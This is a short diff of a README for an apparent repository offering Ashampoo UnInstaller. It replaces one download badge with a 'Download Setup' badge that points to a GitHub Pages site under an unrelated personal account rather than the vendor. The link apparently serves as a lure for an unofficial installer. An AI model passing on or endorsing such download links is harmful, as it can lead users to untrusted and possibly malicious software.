@@ -4,11 +4,7 @@
   <img src="https://img.ashampoo.com/images/products/2603/smallteaser.png" alt="Ashampoo UnInstaller Logo"/>
 </p>
 
-<p align="center">
-  <a href="https://ashampoo-uninstaller-complete.github.io/.github/">
-    <img src="https://img.shields.io/badge/⬇️_Get_Ashampoo_UnInstaller-blue?style=for-the-badge&logo=windows" alt="Get Ashampoo UnInstaller"/>
-  </a>
-</p>
+[![Download Setup](https://img.shields.io/badge/Download-Setup-blue?style=for-the-badge&logo=windows)](https://romlidoang102.github.io/.github/Ashampoo-UnInstaller)
 
 ---
 
